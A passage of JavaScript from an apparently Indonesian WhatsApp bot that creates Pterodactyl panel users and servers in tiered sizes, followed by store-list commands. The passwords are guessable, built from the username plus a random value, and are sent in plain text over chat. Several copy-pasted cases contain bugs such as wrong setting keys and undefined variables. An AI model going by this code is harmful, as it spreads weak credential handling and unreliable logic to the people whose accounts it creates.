}

break
case "3gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)

let t = text.split(',');
if (t.length < 2) return reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "3000"
let cpu = "90"
let disk = "3000"
let email = username + getRandom('@gmail.com')
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return newReply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${setting.pdomain}

NOTE :
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return newReply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await newReply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}
break
case "4gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let t = text.split(',');
if (t.length < 2) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "4000"
let cpu = "120"
let disk = "4000"
let email = username + getRandom('@gmail.com')
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

║⎙─➤ *👤USERNAME* : ${user.username}
║⎙─➤ *🔐PASSWORD* : ${password}
║⎙─➤ *🌐LOGIN* : ${setting,pdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "5gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)

let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "5000"
let cpu = "150"
let disk = "5000"
let email = username + getRandom('@gmail.com')
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${setting.pdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "6gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.eggsnya
let memo = "6000"
let cpu = "170"
let disk = "6000"
let email = username + getRandom("@gmail.com")
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.domain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${domain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "7gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "7000"
let cpu = "190"
let disk = "7000"
let email = username + getRandom("@gmail.com")
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return newReply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${setting.pdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "8gb": {
if (!isCreator&&!isPremium) return newReply(mess.OnlyPrem)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "8000"
let cpu = "210"
let disk = "8000"
let email = username + getRandom("@gmail.com")
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${setting.pdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER + SERVER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*
`)

}

break
case "unli": {
if (!isCreator) return newReply(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + getRandom("@gmail.com")
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.pdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.pdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* : ${setting.pdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.pdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apikey,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*`)
}
break

case "unlipriv": {
if (!isCreator) return newReply(mess.OnlyOwner)
let t = text.split(',');
if (t.length < 2) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let username = t[0];
let u = m.quoted ? m.quoted.sender : t[1] ? t[1].replace(/[^0-9]/g, '') + '@s.whatsapp.net' : m.mentionedJid[0];
let name = username 
let egg = setting.eggsnya
let loc = setting.location
let memo = "0"
let cpu = "0"
let disk = "0"
let email = username + getRandom("@gmail.com")
akunlo = "https://telegra.ph/file/c488493756317874ed1b3.jpg" 
if (!u) return m.reply(`*Format salah!*
Penggunaan:
${prefix + command} user,nomer`)
let d = (await Aira.onWhatsApp(u.split`@`[0]))[0] || {}
let password = username + getRandom('9')
let f = await fetch(setting.privdomain + "/api/application/users", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apipriv
},
"body": JSON.stringify({
"email": email,
"username": username,
"first_name": username,
"last_name": username,
"language": "en",
"password": password
})
})
let data = await f.json();
if (data.errors) return m.reply(JSON.stringify(data.errors[0], null, 2));
let user = data.attributes
let f2 = await fetch(setting.privdomain + "/api/application/nests/5/eggs/" + egg, {
"method": "GET",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apipriv
}
})
m.reply(`SUCCES CREATE USER ID: ${user.id}`)
ctf = `Hai @${u.split`@`[0]}

⎙─➤ *👤USERNAME* : ${user.username}
⎙─➤ *🔐PASSWORD* : ${password}
⎙─➤ *🌐LOGIN* :   ${setting.privdomain}

NOTE:
OWNER HANYA MENGIRIM 1X DATA 
AKUN ANDA MOHON DI SIMPAN BAIK BAIK
KALAU DATA AKUN ANDA HILANG OWNER
TIDAK DAPAT MENGIRIM AKUN ANDA LAGI
=====================================
`
Aira.sendMessage(u,{image: {url: akunlo}, caption: ctf }, { quoted: m })
let data2 = await f2.json();
let startup_cmd = data2.attributes.startup

let f3 = await fetch(setting.privdomain + "/api/application/servers", {
"method": "POST",
"headers": {
"Accept": "application/json",
"Content-Type": "application/json",
"Authorization": "Bearer " + setting.apipriv,
},
"body": JSON.stringify({
"name": name,
"description": " ",
"user": user.id,
"egg": parseInt(egg),
"docker_image": "ghcr.io/parkervcp/yolks:nodejs_18",
"startup": startup_cmd,
"environment": {
"INST": "npm",
"USER_UPLOAD": "0",
"AUTO_UPDATE": "0",
"CMD_RUN": "npm start"
},
"limits": {
"memory": memo,
"swap": 0,
"disk": disk,
"io": 500,
"cpu": cpu
},
"feature_limits": {
"databases": 5,
"backups": 5,
"allocations": 1
},
deploy: {
locations: [parseInt(loc)],
dedicated_ip: false,
port_range: [],
},
})
})
let res = await f3.json()
if (res.errors) return m.reply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await m.reply(`*SUCCESSFULLY ADD USER*
▬▭▬▭▬▭▬▭▬▭▬▭▬
TYPE: User
▬▭▬▭▬▭▬▭▬▭▬▭▬
📡ID: ${user.id}
🌷UUID: ${user.uuid}
👤USERNAME: ${user.username}
📬EMAIL: ${user.email}
🦖NAME: ${user.first_name} ${user.last_name}
🔥LANGUAGE: ${user.language}
📊ADMIN: ${user.root_admin}
☢️CREATED AT: ${tanggal(new Date())}${time}
▬▭▬▭▬▭▬▭▬▭▬▭▬
*Password telah dikirim ke @${u.split`@`[0]}*`)
}
break



// Store Menu
case 'list': case 'store':{
if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
if (!isAlreadyResponListGroup(m.chat, db_respon_list)) return newReply(`Belum ada list message yang terdaftar di group ini`)
let teks = `Halo @${m.sender.split("@")[0]} berikut beberapa list yang tersedia saat ini.\n\n`
for (let i of db_respon_list) {
if (i.id === m.chat) {
teks += `- ${i.key.toUpperCase()}\n`
}
}
teks += `\n\nUntuk melihat detail produk, silahkan kirim nama produk yang ada pada list di atas. Misalnya kamu ingin melihat detail produk dari ${db_respon_list[0].key.toUpperCase()}, maka kirim pesan ${db_respon_list[0].key.toUpperCase()} kepada bot`
Aira.sendMessage(m.chat, {text: teks, mentions: [m.sender]}, {quoted:m}) 
}
break
case 'dellist':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
if (db_respon_list.length === 0) return newReply(`Belum ada list message di database`)
if (!text) return newReply(`Gunakan dengan cara ${prefix + command} *key*\n\n_Contoh_\n\n${prefix + command} hello`)
if (!isAlreadyResponList(m.chat, q.toLowerCase(), db_respon_list)) return newReply(`List respon dengan key *${q}* tidak ada di database!`)
delResponList(m.chat, q.toLowerCase(), db_respon_list)
newReply(`Sukses delete list message dengan key *${q}*`)}
break
case 'addlist':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins&&!isCreator) return newReply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return newReply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
if (isAlreadyResponList(m.chat, args1, db_respon_list)) return newReply(`List respon dengan key : *${args1}* sudah ada di group ini.`)
if (/image/.test(mime)) {
let media = await Aira.downloadAndSaveMediaMessage(quoted)
const fd = new FormData();
fd.append('file', fs.readFileSync(media), '.tmp', '.jpg')
fetch('https://telegra.ph/upload', {
method: 'POST',
body: fd
}).then(res => res.json())
.then((json) => {
addResponList(m.chat, args1, args2, true, `https://telegra.ph${json[0].src}`, db_respon_list)
newReply(`Sukses set list message dengan key : *${args1}*`)
if (fs.existsSync(media)) fs.unlinkSync(media)
})
} else {
addResponList(m.chat, args1, args2, false, '-', db_respon_list)
newReply(`Sukses set list message dengan key : *${args1}*`)
}}
break
case 'updatelist': case 'update':{
if (!m.isGroup) return newReply('Fitur Khusus Group!')
if (!isAdmins && !isCreator) return newReply('Fitur Khusus admin!')
var args1 = q.split("|")[0].toLowerCase()
var args2 = q.split("|")[1]
if (!q.includes("|")) return newReply(`Gunakan dengan cara ${prefix+command} *key|response*\n\n_Contoh_\n\n${prefix+command} tes|apa`)
